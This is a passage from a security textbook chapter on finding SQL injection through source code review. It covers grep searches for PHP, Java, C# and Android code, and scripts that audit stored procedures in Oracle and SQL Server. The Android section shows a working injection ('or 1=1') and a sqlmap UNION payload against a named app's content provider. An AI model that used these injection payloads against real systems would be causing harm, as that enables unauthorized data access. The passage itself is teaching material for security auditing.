where field = ‘ $input’” ; you can see from the preceding output that the sql statement is a select statement and it is being concatenated with the contents of another variable, $input . you do not know what the value of $input is, and you don’t know whether it contains user -controlled data or whether it is tainted. so, you c annot say whether a vulnerability exists. you need to trace the $input variable. to do this you can use the following command: $ grep -r -n “\\$input =.∗ \\$.∗” src/ | awk - f: ‘{print “filename: “$1”\\nline: “$2”\\nmatch: “$3”\\n\\n”}’ the preceding command will allow you to search for all instances where the $input variable is assigned a value from an http request method, such as $_get , $http_get_vars , $_post , $http_post_vars , $_request , $_cookie , $http_cookie_vars , $_server , and $http_server_vars , as well as any instance where the value is set from another variable. from the following output you can see that the variable has been assigned its value from a variable submitted via the post method: filename: src/sqli.mysql.vulnerable.php line: 10 match: $input = $_post[‘name’]; you now know that the $input variable has been populated from a user -controlled parameter submitted via an http post request and that the variable has been concatenated with an sql statement to form a new string variable ( $sql). the sql statement is then passed to a function that executes the sql statement against a mysql database. at this stage, you may feel tempted to state that a vulnerability exists; however, you still can’t be sure that the $input variable is tainted. now that you know that the field contains user controlled data, it is worth performing an extra search on just the variable name. you can use the following command to do this: $ grep -r -n “\\$input” src/ | awk -f: ‘{print “filename: “$1” \\nline: “$2” \\nmatch: “$3”\\n\\n”}’ if the p receding command returns nothing more than the previous results, you can safely state that a vulnerability exists. however, you may find code similar to the following: filename: src/sqli.mysql.vulnerable.php line: 11 match: if (is_string($input)) { filename: src/sqli.mysql.vulnerable.php line: 12 match: if (strlen($input) < $maxlength){ filename: src/sqli.mysql.vulnerable.php line: 13 match: if (ctype_alnum($input)) { the preceding output appears to suggest that the developer is performing some input validation on the user -controlled input parameter. the $input variable is being checked to ensure that it is a string, conforms to a set boundary, and consists of alphanume ric characters only. you have now traced the user input through the application, you have identified all of the dependencies, you have been able to make informed decisions about whether a vulnerability exists, and most importantly, you are in a position to provide evidence to support your claims. now that you are well versed in reviewing php code for sql injection vulnerabilities, let’s take a look at applying the same techniques to a java application. to save repetition the following two sections will not cover all eventualities in depth; instead, you should use the techniques outlined in this section to assist you when reviewing other languages (however, the following sections will give you enough detail to get you started). following data in java you can use the following command to recursively search a directory of java source files for the use of preparestatement() , executequery() , executeupdate() , execute() , addbatch() , and executebatch() : $ grep - r -n “preparedstatement(\\ |executequery( \\|executeupdate(\\ |execute(\\ |addbatch( \\|executebatch(” src/ | awk - f: ‘{print “filename: “$1” \\nline: “$2”\\ nmatch: “$3”\\ n\\n”}’ the results of executing the preceding command are shown here. you can clearly see that you have identified three lines of code that warrant further investigation: filename: src/sqlvuln.java line: 89 match: resultset rs = statement.executequery(sql); filename: src/sqlvuln.java line: 139 match: statement.executeupdate(sql); filename: src/sqlvuln.java line: 209 match: resultset rs = statement.ex ecutequery(“ select field from table where field = “ + request.getparameter(“input”)); lines 89 and 139 warrant further investigation because you do not know the value of the sql variable. it probably contains an sql statement to execute, but you do not know whether it was built using user input or whether it is tainted. so, at this stage you cannot say whether a vulnerability exists. you need to trace the sql variable. however, you can see that on line 209 an sql statement is built from user -controlled inp ut. the statement does not validate the value of the input parameter submitted via an http web form, so it is tainted. you can state that line 209 is vulnerable to sql injection. however, you need to work a little harder to investigate lines 89 and 139. you could try the following grep command to identify points in the code where a dynamic sql statement is built and assigned to the sql variable: $ grep –i -r -n “sql =.∗ \\”\\(select\\ |update\\|insert\\ |drop\\)” src/ | awk -f: ‘{print “filename: “$1”\\nline: “$2”\\nmatch: “$3”\\ n\\n”}’ filename: src/sqlvuln.java line: 88 match: string sql = (“select field from table where field = ” + request.getparameter(“input”)); filename: src/sqlvuln.java line: 138 match: string sql = (“insert into table values field = (” + request.getparameter (“input”) + ”) where field = ” + request.getparameter(“more -input”) + ”); you can see that on lines 88 and 138 an sql statement is built from user -controlled input. the statem ent does not validate the value of the parameters submitted via an http web form. you have now traced the user input through the application, have been able to make informed decisions about whether a vulnerability exists, and are in a position to provide e vidence to support your claims. if you want to identify sink sources so that you can effectively trace tainted data back to its origin you can use the following command: $ grep -r -n “getparameter(\\ |getparametervalues(\\ |getquerystring(\\ |getheader (\\|getheaders( \\|getrequestedsessionid( \\|getcookies(\\ |getvalue(” src/ | awk -f: ‘{print “filename: “$1”\\ nline: “$2”\\ nmatch: “$3”\\ n\\n”}’ now that you are well versed in reviewing php and java code for sql injection vulnerabilities, it’s time to test your skills by ap plying the same techniques to a c# application. following data in c# you can use the following command to recursively search a directory of c# source files for the use of sqlcommand() , sqlparameter() , oledbcommand() , oledbparameter() , oraclecommand() , oracleparameter() , odbccommand() , and odbcparameter() : $ grep - r -n “sqlcommand(\\ |sqlparameter( \\|oledbcommand(\\ |oledbparameter (\\|oraclecommand(\\ |oracleparameter(\\ |odbccommand(\\ |odbcparameter(” src/ | awk - f: ‘{print “filename: “$1”\\ nline: “$2”\\ nmatch: “$3”\\ n\\n”}’ filename: src/sqlimssqlvuln.cs line: 29 match: sqlcommand command = new sqlcommand(“select ∗ from table where field = ’” + request.getparameter(“ input”) + “’”, conn); filename: src/sqlioraclevuln.cs line: 69 match: oraclecommand command = new oraclecommand(sql, conn); line 69 warrants further investigation, as you do not know the value of the sql variable. it probably contains an sql statement to execute, but you do not know whether it was built using user input or whether it is tainted. so, at this st age you cannot say whether a vulnerability exists. you need to trace the sql variable. however, you can see that on line 29 an sql statement is built from user -controlled input. the statement does not validate the value of the input parameter submitted via an http web form, so it is tainted. you can state that line 29 is vulnerable to sql injection. however, you need to work a little harder to investigate line 69. you could try the following grep command to identify points in the code where a dynamic sql statement is built and assigned to the sql variable: $ grep –i -r -n “sql =.∗ \\” \\(select\\ |update\\|insert\\ |drop\\) ” src/ | awk -f: ‘{print “filename: “$1”\\ nline: “$2”\\ nmatch: “$3”\\ n\\n”}’ filename: src/sqlioraclevuln.cs line: 68 match: string sql = “select ∗ from table where field = ’” + request.getparameter(“ input”) + “’”; you can see that on line 68 an sql statement is built from user -controlled input. the statement does not validate the value of the parameter submitted via an http web form and is tainted. you have now traced the user input through the application, you have been able to make informed decisions about whether a vulnerability exists, and you are in a position to provide evidence to support your claims. if you want to identify sink sources so that you can effectively trace tainted data back to their origin, you can use the following command: $ grep - r -n “httpcookiecollection\\ |form\\|headers\\ |params\\ |querystring\\ |servervariables\\ |url\\|useragent \\|userhostaddress\\ |userhostname” src/ | awk - f: ‘{print “filename: “$1”\\ nline: “$2”\\nmatch: “$3”\\ n\\n”}’ in real life, you may have to amend the grep strings several times, rule out findings due to the ambiguous naming schemes in use by a given developer, and follow the execution flow through the application, perhaps having to analyze numerous files, includes, and classes. however, the t echniques you learned here should be very useful in your endeavors. reviewing android application code since the first incarnation of this book smart phone applications, such as those written for the android platform, have increased their presence in the corporate world exponentially. many companies have embraced the platform for the deployment of custom -built in -house business applications as well as purchasing of third party developed applications for use within corporate environments. i’ve personally been performing a lot of mobile application assessments on all of the major platforms (ios, blackberry os, android, etc.). when assessing android devices and applications i regularly come across vulnerabilities in android content providers. these vulnerabilities are often similar to those found in web application security assessments. in particular sql injection and directory traversal vulnerabilities are common problems in content -providers. here we will obviously concentrate on the sql injection issues. content -providers store and retrieve data and make them accessible to all applications (http://developer.android.com/guide/topics/providers/content -providers.html ). nils, a colleague at mwr infosecurity authored a tool named “webcontentresolver” (http://labs.mwrinfosecurity.com/tools/android_webcontentresolver ) that can run on an android device (or emulator) and exposes a web service interface to all -installed content providers. this allows us to use a web browser to test for vulnerabilities and leverage the power of tools, such as sqlmap ( http://sqlmap.sourceforge.net ), to find and exploit vulnerabilities in content -providers. i recommend you give it a go if you are assessing android applications. in this section i’m going to show you how to leverage the same techniques that you have learnt to use for traditional web applications written in java, php, and .net against android applications (java) to find sql injection vulnerabilities within sqlite databases; however the webcontentresolver utility will prove useful when you want to validate your findings and create proof of concept (poc) exploits for the discovered vulnerabilities —chapter 4 goes into more detail about how to leverage this tool to find and exploit sql injection vulnerabilities in android applications. if you do not have access to the source; then it is a trivial process to gain access to the source code of an android application. android runs applications that are in dalvik executable (.dex) format and the android application package file (apk) can easily be converted to a java archive (jar) using a utility such as dex2jar ( http://code.google.com/p/dex2jar ). a java de compiler, such as jdgui ( http://java.decompiler.free.fr/?q=jdgui) and/or jad (www.varan eckas.com/jad ), can then be used to decompile and view the source. as before, we need to become familiar with the “dangerous functions”—android developers make use of two classes to interact with the sqlite database: sqlitequerybuilder and sqlitedatabase. the android.database.sqlite.sqlitequerybuilder is a convenience class that helps build sql queries to be sent to sqlitedatabase objects (http://developer .android.com/reference/android/database/sqlite/sqlitequerybuilder.html ) and the android.database.sqlite.sqlitedatabase class exposes methods to manage sqlite databases (http://developer.android.com/reference/android/database/sqlite/sqlitedatabase.html ). the relevant methods for the classes are detailed below: // android.database.sqlite.sqlitequerybuilder // construct a select statement suitable for use in a group of select statements that will be joined through union operators in buildunionquery. buildquery(string[] projectionin, string selection, string groupby, string having, string sortorder, string limit) // build an sql query string from the given clauses. buildquerystring(boolean distinct, string tables, string[] columns, string where, string groupby, string having, string orderby, string limit) // given a set of subqueries, all of which are select statements, construct a query that returns the union of what those subqueries return buildunionquery(string[] subqueries, string sortorder, string limit) // construct a select statement suitable for use in a group of select statements that will be joined through union operators in buildunionquery. buildunionsubquery(string typediscriminatorcolumn, string[] unioncolumns, set<string> columnspresentintable, int computedcolumnsoffset, string typediscriminatorvalue, string selection, string groupby, string having) // perform a query by combining all curr ent settings and the information passed into this method. query(sqlitedatabase db, string[] projectionin, string selection, string[] selectionargs, string groupby, string having, string sortorder, string limit) // android.database.sqlite.sqlitedatabase // convenience method for deleting rows in the database. delete(string table, string whereclause, string[] whereargs) // execute a single sql statement that is not a select or any other sql statement that returns data. execsql(string sql) // execute a single sql statement that is not a select/insert/update/delete. execsql(string sql, object[] bindargs) // convenience method for inserting a row into the database. insert(string table, string nullcolumnhack, contentvalues values) // convenience method for inserting a row into the database. insertorthrow(string table, string nullcolumnhack, contentvalues values) // general method for inserting a row into the database. insertwithonconflict(string table, string nullcolumnhack, contentvalues initialvalues, int conflictalgorithm) // query the given table, returning a cursor over the result set. query(string table, string[] columns, string selection, string[] selectionargs, string groupby, string having, string orderby, string limit) // query the given url, returning a cursor over the result set. querywithfactory(sqlitedatabase.cursorfactory cursorfactory, boolean distinct, string table, string[] columns, string selection, string[] selectionargs, string groupby, string having, string orderby, string limit) // runs the provided sql and returns a cursor over the result set. rawquery(string sql, string[] selectionargs) // runs the provided sql and returns a cursor over the result set. rawquerywithfactory(sqlitedatabase.cursorfactory cursorfactory, string sql, string[] selectionargs, string edittable) // convenience method for replacing a row in the database. replace(string table, string nullcolumnhack, contentvalues initialvalues) // convenience method for replacing a row in the database. replaceorthrow(string table, string nullcolumnhack, contentvalues initialvalues) // convenience method for updating rows in the database. update(string table, contentvalues values, string wherecla use, string[] whereargs) // convenience method for updating rows in the database. updatewithonconflict(string table, contentvalues values, string whereclause, string[] whereargs, int conflictalgorithm) the shell one -liner below can be used to recursively s earch the file system for source files that contain references to the methods of the aforementioned classes: $ grep - r -n “delete(\\ |execsql( \\|insert(\\ |insertorthrow(\\ |insertwithonconflict( \\|query(\\ |querywithfacto ry(\\|rawquery( \\|rawquerywithfactory(\\ |replace(\\ |replaceorthrow(\\ |update( \\|updatewithonconf lict(\\|buildquery( \\|buildquerystring(\\ |buildunionquery(\\ |buildunionsubquery(\\ |query(” src/ | awk -f: ‘{print “filename: “$1”\\ nline: “$2”\\ nmatch: “$3” \\n\\n”}’ as previously discussed it is often necessary to trac e the data through the application, as the output of the command above may identify an immediately obvious vulnerability, or it could provide you with a variable that you need to trace in order to determine if it has been built with tainted data. the command below can be used to search for string declarations that contain dynamic sql statements to aid in your efforts: $ grep -i -r -n “string.∗ =.∗\\”\\(select\\ |update\\|insert\\ |drop\\)” src/ | awk -f: ‘{print “filename: “$1”\\nline: “$2”\\nmatch: “$3”\\n\\n”}’ an example of how these techniques can be leveraged against a real world application is presented below (with some output omitted for brevity): $ svn checkout http://android- sap-note-viewer.googlecode.com/svn/trunk/sap- note-viewer $ grep - r -n “delete(\\ |execsql( \\|insert(\\ |insertorthrow(\\ |insertwithonconflict( \\|query(\\ |querywithfacto ry(\\|rawquery( \\|rawquerywithfactory(\\ |replace(\\ |replaceorthrow(\\ |update( \\|updatewithonconf lict(\\|buildquery( \\|buildquerystring(\\ |buildunionquery(\\ |buildunionsubquery(\\ |query(“sapnote-viewer/ | awk - f: ‘{print “filename: “$1”\\ nline: “$2” \\nmatch: “$3” \\n\\n”}’ filename: sap- note-viewer/sapnoteview/src/org/sapmentors/sapnoteview/db/sapnoteprovider.java line: 106 match: public cursor query(uri uri, string[] projection, string selection, string[] selectionargs, string sortorder) { filename: sap- note-viewer/sapnoteview/src/org/sapmentors/sapnoteview/db/sapnoteprovider.java line: 121 match: cursor c = qbuilder.query(db, projection, selection, selectionargs, null, null, sortorder); we can see that we have two lines of particular interest. the parameters of a content provider break down as follows: • uri: the uri requested • string[] pro jection: representing the columns (projection) to be retrieved • string[] selection: the columns to be included in the where clause • string[] selectionargs: the values of the selection columns • string sortorder: the order by statement as can be seen from the source below, the input is implicitly trusted and therefore we have identified a sql injection vulnerability: @override public cursor query(uri uri, string[] projection, string selection, string[] selectionargs, string sortorder) { sqlitequerybuilder qbuilder = new sqlitequerybuilder(); qbuilder.settables(database_table); //if search is empty add a wildcard, it has content add wildcard before and after if(selectionargs!=null && selectionargs[0].length()==0){ selectionargs[0] = “%”; } else if (selectionargs!=null && selectionargs[0].length()>0){ selectionargs[0] = “%” +selectionargs[0]+ “%”; } //map from internal fields to fields searchmanager understands qbuilder.setprojectionmap(note_projection_map); sqlitedatabase db = dbhelper.getreadabledatabase(); //do the query cursor c = qbuilder.query(db, projection, selection, selectionargs, null, null, sortorder); return c; } to prove the exploitability of the vulnerability, the webcontentresolver utility should be installed along side the vulnerable application. the utility exposes a web service interface to all-installed content -providers. we can use the webcontentresolver ut ility to list the accessible content -provider as illustrated below: $ curl http://127.0.0.1:8080/list package: org.sapmentors.sapnoteview authority: org.sapmentors.sapnoteview.noteprovider exported: true readperm: null writeperm: null we can then query the content provider as such: $ curl http://127.0.0.1:8080/query?a=org.sapmentors.sapnoteview.noteprovider?&selname=_id&selid=1 1223 query successful: column count: 3 row count: 1 | _id | suggest_text_1 | suggest_intent_data | 11223 | secret text | 11223 the sql statement that is actually executed is illustrated below: select _id, title as suggest_text_1, _id as suggest_intent_data from notes where (_id=11223) we can then test for sql injection within the selection as such: $ curl http://127.0.0.1:8080/query?a=org.sapmentors.sapnoteview.noteprovider?&selname=_id&selid=1 1223%20or%201=1 query successful: column count: 3 row count: 4 | _id | suggest_text_1 |suggest_intent_data | 11223 | secret text | 11223 | 12345 | secret text | 12345 | 54321 | super secret text | 54321 | 98765 | shhhh secret | 98765 the sql statement that is executed is presented below: select _id, title as suggest_text_1, _id as suggest_intent_data from notes where (_id=11223 or 1=1) note that both the selname and selid parameters are vulnerable. exploitation can then be automated using sqlmap: $ ./sqlmap.py - u “http://127.0.0.1:8080/query?a =org.sapmentors.sapnoteview.noteprovider?&selname=_id&selid= 11223’-b--dbms=sqlite sqlmap/1.0 -dev (r4409) - automatic sql injection and database takeover tool http://www.sqlmap.org [!] legal disclaimer: usage of sqlma p for attacking targets without prior mutual consent is illegal. it is the end user’s responsibility to obey all applicable local, state and federal laws. authors assume no liability and are not responsible for any misuse or damage caused by this program [∗] starting at 18:12:33 [18:12:33] [info] using ‘/users/nmonkee/toolbox/application/sqli/sqlmap/output/127.0.0.1/session’ as session file [18:12:33] [info] testing connection to the target url [18:12:33] [info] testing if the url is stable, wait a few seconds [18:12:34] [info] url is stable [18:12:34] [info] testing if get parameter ‘a’ is dynamic [18:12:34] [info] confirming that get parameter ‘a’ is dynamic [18:12:34] [info] get parameter ‘a’ is dynamic [18:12:35] [warning] heuristic test shows that get parameter ‘a’ might not be injectable [18:12:35] [info] testing sql injection on get parameter ‘a’ [18:12:35] [info] testing ‘and boolean -based blind - where or having clause’ [18:12:36] [info] testing ‘generic union query (null) - 1 to 10 columns’ [18:12:39] [warning] get parameter ‘a’ is not injectable [18:12:39] [info] testing if get parameter ‘selname’ is dynamic [18:12:39] [info] confirming that get parameter ‘selname’ is dynamic [18:12:39] [info] get parameter ‘selname’ is dynamic [18:12:39] [warning] heuristic test shows that get parameter ‘selname’ might not be injectable [18:12:39] [info] testing sql injection on get parameter ‘selname’ [18:12:39] [info] testing ‘and boolean -based blind - where or having clause’ [18:12:40] [info] testing ‘generic uni on query (null) - 1 to 10 columns’ [18:12:40] [info] order by technique seems to be usable. this should reduce the time needed to find the right number of query columns. automatically extending the range for union query injection technique [18:12:41] [info] target url appears to have 3 columns in query [18:12:41] [info] get parameter ‘selname’ is ‘generic union query (null) - 1 to 10 columns’ injectable get parameter ‘selname’ is vulnerable. do you want to keep testing the others? [y/n] n sqlmap identified the following injection points with a total of 79 http(s) requests: --- place: get parameter: selname type: union query title: generic union query (null) - 3 columns payload: a=org.sapmentors.sapnoteview.noteprovider?&selname=_id) union all select null, ‘:xhc:’||‘xyevutvgem’||‘:cbo:’, null-- and (828=828&selid=11223 --- [18:12:46] [info] the back- end dbms is sqlite [18:12:46] [info] fetching banner back-end dbms: sqlite banner: ‘3.6.22’ [18:12:46] [info] fetched data logged to text files under ‘/users/nmonkee/toolbox/application/sqli/sqlmap/output/127.0.0.1’ [∗] shutting down at 18:12:46 reviewing pl/sql and t -sql code oracle pl/sql and microsoft transact -sql (t -sql) codes are very different and in most cases more insecure than conventio nal programming codes such as php, .net, java, and the like. for example, oracle has historically suffered from multiple pl/sql injection vulnerabilities in code within the built- in database packages that are shipped by default with the database product. p l/sql code executes with the privileges of the definer, and therefore has been a popular target for attackers looking for a reliable way to elevate their privileges. so much so that oracle itself has ironically published a paper dedicated to educating deve lopers on how to produce secure pl/sql (www.oracle.com/technology/tech/pl_sql/pdf/how_to_write_injection_proof_plsql.pdf ). however, a stored procedure c an run either with the rights of the caller ( authid current_user ) or with the rights of the procedure’s owner ( authid definer ). you can specify this behavior with the authid clause when creating a procedure. programming codes such as t -sql and pl/sql are n ot usually made available to you in handy text files, though. to analyze the source of a pl/sql procedure you have two options. the first is to export the source code from the database. to achieve this you can use the dbms_metadata package. you can use the following sql ∗plus script to export the data definition language (ddl) statements from the oracle database. ddl statements are sql statements that define or alter a data structure such as a table. hence, a typical ddl statement is create table or alter table : -- purpose: a pl/sql script to export the ddl code for all database objects -- version: v 0.0.1 -- works against: oracle 9i, 10g and 11g -- author: alexander kornbrust of red- database- security gmbh -- set echo off feed off pages 0 trims on term on trim on linesize 255 long 500000 head off -- execute dbms_metadata.set_transform_param(dbms_metadata.session_transform,‘storage’,false); spool getallunwrapped.sql -- select ‘spool ddl_source_unwrapped.txt’ from dual; -- -- create a sql scripts containing all unwrapped objects select ‘select dbms_metadata.get_ddl(’’’||object_type||’’’,’’’||object_name||’’’,’’’|| owner||’’’) from dual;’ from (select ∗ from all_objects where object_id not in(select o.obj# from source$ s, obj$ o,user$ u where ((lower(s.source) like ‘%function%wrapped%’) or (lower (s.source) like ‘%procedure%wrapped%’) or (lower(s.source) like ‘%package%wrapped%’)) and o.obj#=s.obj# and u.user#=o.owner#)) where object_type in (‘function’, ‘procedure’, ‘package’, ‘trigger’) and owner in (‘sys’) order by owner,object_type,object_name; -- -- spool a spool off into the spool file. select ‘spool off’ from dual; spool off -- -- generate the ddl_source -- @getallunwrapped.sql quit the second option available to you is to construct your own sql statements to search the database for interesting pl/sql codes. oracle stores pl/sql source codes within the all_source and dba_source views; that is, if the code has not been obfuscated (obfu scation is a technique used to convert human- readable text into a format that is not easily read). you can do this by accessing the text column from within one of the two views. of immediate interest should be any code that utilizes the execute immediate or dbms_sql function. oracle pl/sql is case- insensitive, so the code you are searching for could be constructed as execute, execute, or execute, and so forth. therefore, be sure to use the lower(text) function within your query. this converts the value of t ext to lowercase so that your like statement will match all of these eventualities. if unvalidated input is passed to these functions, just like within the previous application programming language examples, it may be possible to inject arbitrary sql state ments. you can use the following sql statement to obtain the source for pl/sql code: select owner as owner, name as name, type as type, text as source from dba_source where ((lower(source) like ‘%immediate%’) or (lower(source) like ‘%dbms_sql’)) and owner= ‘plsql’; owner name type source ------------------------------------------------- plsql dsql procedure execute immediate(param); owner name type source ------------------------------------------------- plsql example1 procedure execute immediate(‘select cou nt(∗) from ’ ||param) into i; owner name type source ------------------------------------------------- plsql example2 procedure execute immediate(‘select count(∗ ) from all_users where user_id=’ ||param) into i; the output from the search query has presented three very likely candidates for closer inspection. the three statements are vulnerable because user -controlled data are passed to the dangerous functions without being validated. however, similar to applicati on developers, database administrators (dbas) often first copy parameters to locally declared variables. to search for pl/sql code blocks that copy parameter values into dynamically created sql strings you can use the following sql statement: select text as source from dba_source where name=‘sp_stored_procedure’ and owner=‘sysman’ order by line; source ---------------------------------------------------------------------- 1 create or replace procedure sp_storedprocedure (input in varchar2) as 2 sql varchar2 ; 3 begin 4 sql:=‘select field from table where field =’’’ || input || ’’’’; 5 execute immediate sql; 6 end; the preceding sql statement has found a package that dynamically creates an sql statement from user -controlled input. it would be worth taking a cl oser look at this package. you can use the following sql statement to dump the source for the package so that you can inspect things a little more closely: select text as source from dba_source where name=‘sp_stored_procedure’ and owner=‘sysman’ order by l ine; source ------------------------------------------------------------------------- 1 create or replace procedure sp_ storedprocedure (input in varchar2) as 2 sql varchar2; 3 begin 4 sql:= ‘select field from table where field = ’’’ || input || ’’’’; 5 execute immediate sql; 6 end; in the preceding case, the input variable is taken directly from the user input and concatenated with the sql string sql. the sql string is passed to the execute function as a parameter and is executed. the preceding oracle stor ed procedure is vulnerable to sql injection even though the user input is passed to it as a parameter. you can use the following pl/sql script to search all pl/sql codes in the database to find a code that is potentially vulnerable to sql injection. you wi ll need to closely scrutinize the output, but it should help you to narrow your search: -- purpose: a pl/sql script to search the db for potentially vulnerable -- pl/sql code -- version: v 0.0.1 -- works against: oracle 9i, 10g and 11g -- author: alexander kornbrust of red- database- security gmbh -- select distinct a.owner,a.name,b.authid,a.text sqltext from all_source a,all_procedures b where ( lower(text) like ‘%execute%immediate%(%||%)%’ or lower(text) like ‘%dbms_sql%’ or lower(text) like ‘%grant%to%’ or lower(text) like ‘%alter%user%identified%by%’ or lower(text) like ‘%execute%immediate%’’%||%’ or lower(text) like ‘%dbms_utility.exec_ddl_statement%’ or lower(text) like ‘%dbms_ddl.create_wrapped%’ or lower(text) like ‘%dbms_hs_passthrough.execute_immediate%’ or lower(text) like ‘%dbms_hs_passthrough.parse%’ or lower(text) like ‘%owa_util.bind_variables%’ or lower(text) like ‘%owa_util.listprint%’ or lower(text) like ‘%owa_util.tableprint%’ or lower(text) like ‘%dbms_sys_sql.%’ or lower(text) like ‘%ltadm.execsql%’ or lower(text) like ‘%dbms_prvtaqim.execute_stmt%’ or lower(text) like ‘%dbms_streams_rpc.execute_stmt%’ or lower(text) like ‘%dbms_aqadm_sys.execute_stmt%’ or lower(text) like ‘%dbms_streams_adm_utl.execute_sql _string%’ or lower(text) like ‘%initjvmaux.exec%’ or lower(text) like ‘%dbms_repcat_sql_utl.do_sql%’ or lower(text) like ‘%dbms_aqadm_syscalls.kwqa3_gl_executestmt%’ ) and lower(a.text) not like ‘% wrapped%’ and a.owner=b.owner and a.name=b.object_name and a.owner not in (‘olapsys’,‘oracle_ocm’,‘ctxsys’,‘outln’,‘system’,‘exfsys’, ‘mdsys’,‘sys’,‘sysman’,‘wksys’,‘xdb’,‘flows_040000’,‘flows_030000’,‘flows_030100’, ‘flows_020000’,‘flows_020100’,‘flows020000’,‘flows_010600’,‘flows_010500’, ‘flows_010400’) order by 1,2,3 to analyze the source of a t -sql procedure from within a microsoft sql server database prior to microsoft sql server 2008 you can use the sp_helptext stored procedure. the sp_helptext stored procedure displays the definition that is used to cre ate an object in multiple rows. each row contains 255 characters of the t -sql definition. the definition resides in the definition column in the sys.sql_modules catalog view. for example, you can use the following sql statement to view the source code of a stored procedure: exec sp_helptext sp_storedprocedure; create procedure sp_storedprocedure @input varchar(400) = null as declare @sql nvarchar(4000) select @sql = ‘select field from table where field = ’’’ + @input + ’’’’ exec (@sql) in the preceding exam ple, the @input variable is taken directly from the user input and concatenated with the sql string ( @sql). the sql string is passed to the exec function as a parameter and is executed. the preceding microsoft sql server stored procedure is vulnerable to s ql injection even though the user input is being passed to it as a parameter. two commands that you can use to invoke dynamic sql are sp_executesql and exec() . exec() has been around since sql 6.0; however, sp_executesql was added in sql 7. sp_executesql is a built -in stored procedure that takes two predefined parameters and any number of user -defined parameters. the first parameter, @stmt , is mandatory and contains a batch of one or more sql statements. the data type of @stmt is ntext in sql 7 and sql 2000, and nvarchar(max) in sql 2005 and later. the second parameter, @params , is optional. exec() takes one parameter which is an sql statement to execute. the parameter can be a concatenation of string variables and string literals. the following is an example of a vulnerable stored procedure that uses the sp_executesql stored procedure: exec sp_helptext sp_storedprocedure_ii; create procedure sp_storedprocedure_ii (@input nvarchar(25)) as declare @sql nvarchar(255) set @sql = ‘select field from table where field = ’’’ + @input + ’’’’ exec sp_executesql @sql you can use the following t -sql command to l ist all of the stored procedures in the database: select name from dbo.sysobjects where type =‘p’ order by name asc you can use the following t -sql script to search all stored procedures within an sql server database server (note that this does not work on sql server 2008) to find a t -sql code that is potentially vulnerable to sql injection. you will need to closely scrutinize the output, but it should help you to narrow your search: -- description: a t- sql script to search the db for potentially vulnerable -- t-sql code -- @text – search string ‘%text%’ -- @dbname - database name, by default all databases will be searched -- alter procedure [dbo].[grep_sp]@text varchar(250), @dbname varchar(64) = null as begin set nocount on; if @dbname is null begin --enumerate all databases. declare #db cursor for select name from master...sysdatabases declare @c_dbname varchar(64) open #db fetch #db into @c_dbname while @@fetch_status <> -1begin execute grep_sp @text, @c_dbname fetch #db into @c_dbname end close #db deallocate #db end elsebegin declare @sql varchar(250) --create the find like command select @sql = ‘select ’’’ + @dbname + ’’’ as db, o.name,m.definition’ select @sql = @sql + ‘ from ‘+@dbname+’.sys.sql_modules m’ select @sql = @sql + ‘ inner join ‘+@dbname+’...sysobjects o on m.object_id=o.id’ select @sql = @sql + ‘ where [definition] like ‘‘%’+@text+‘%’’’ execute (@sql) end end make sure you drop the procedure when you’re finished! you can invoke the stored procedure like this: execute grep_sp ‘sp_executesql’; execute grep_sp ‘exec’; you can use the following t -sql command to list user -defined stored procedures on an sql server 2008 database: select name from sys.procedures order by name asc you can use the following t -sql script to search all stored procedures within an sql server 2008 database server and print their source, if the respective line is uncommented. you will need to closely scrutinize the output, but it should help you to narrow your search: declare @name varchar(50) -- database name declare db_cursor cursor for select name from sys.procedures; open db_cursor fetch next from db_cursor into @name while @@fetch_status = 0 beginprint @name -- uncomment the line below to print the source -- sp_helptext ‘‘+ @name + ’’ fetch next from db_cursor into @name end close db_cursor deallocate db_cursor there are two mysql -specific statements for obtaining information about stored procedures. the first one, show procedure status , will output a list of stored procedures and some information (db, name, type, definer, modified, created, security_type, comment) about them. the output from the following command has been modified for readability: mysql> show procedure status; | victimdb | sp_storedprocedure_i | procedure | root@localhost | definer | victimdb | sp_storedprocedure_ii | procedure | root@localhost | definer | victimdb | sp_storedprocedure_iii | procedure | root@localhost | definer the second command, show create procedure sp_name , will output the source of the procedure: mysql> show create procedure sp_storedprocedure_i \\ g ∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗ 1. row ∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗ procedure: sp_ storedprocedure sql_mode: create procedure: create definer=‘root’@’localh ost’ procedure sp_ storedprocedure (input varchar(400)) begin set @param = input; set @sql = concat(‘select field from table where field=’,@param); prepare stmt from @sql; execute stmt; deallocate prepare stmt; end of course, you can also obtain information regarding all stored routines by querying the information_schema database. for a database named dbname, use this query on the information_schema.routines table: select routine_type, routine_name from information_s chema.routines where routine_schema=‘dbname’; automated source code review as previously stated, performing a manual code review is a long, tedious, and laborious process that requires becoming very familiar with the application source code as well as learning all of the intricacies of each application reviewed. in this chapter, you learned how you should approach the task in a methodical way and how you can make extensive use of command -line search utilities to narrow the focus of a review, saving valuable time. however, you will still have to spend a lot of time looking at the source code inside text editors or within your chosen ide. even with a mastery of freely available command -line utilities, a source code review is a daunting task. so, would it not be much nicer to automate the process, perhaps even using a tool that would generate an aesthetically pleasing report? well, yes it would, but you should be aware that automated tools can produce a large number of false positives (a false positive is when a tool reports incorrectly that a vulnerability exists, when in fact one does not) or false negatives (a false negative is when a tool does not report that a vulnerability exists, when in fact one does). false positives lead to distrust in the tool and a lot of time is spent verifying results, whereas false negatives result in a situation where vulnerabilities may go undiscovered and a false sense of security prevails. some automated tools use regular expression string matching to identify sinks (security sensitive functions) and nothing more. there are tools that can identify sinks that directly pass tainted (untrusted) data as parameters to sinks. and there are tools that combine these capabilities with the ability to also identify sink sources (points in the application where untrusted data originate). several of these tools simply rely on the same strategy as we have just discussed, that is, relying heavily on grep- like syntax searches and regular expressions to locate the use of dangerous functions and, i n some cases, simply highlighting codes that incorporates dynamic sql string -building techniques. these static string -matching tools are incapable of accurately mapping data flows or following execution paths. string pattern matching can lead to false posi tives, as some of the tools used to perform the pattern matching are unable to make distinctions between comments in codes and actual sinks. in addition, some regular expressions may match codes that are named similar to the target sinks. for example, a regular expression that attempts to match the mysql_query() function of a sink may also flag the following lines of code: // validate your input if using mysql_query() $result = mycustomfunctiontoexec_mysql_query($sql); $result = mysql_query($sql); to counte r this, some tools implement an approach known as lexical analysis . lexical analysis is the process of taking an input string of characters (such as the source code of a computer program) and producing a sequence of symbols called lexical tokens , or just tokens , which may be handled more easily by a parser. these tools preprocess and tokenize source files (the same first steps a compiler would take) and then match the tokens against a library of security -sensitive functions. programs performing lexical anal ysis are often referred to as lexical 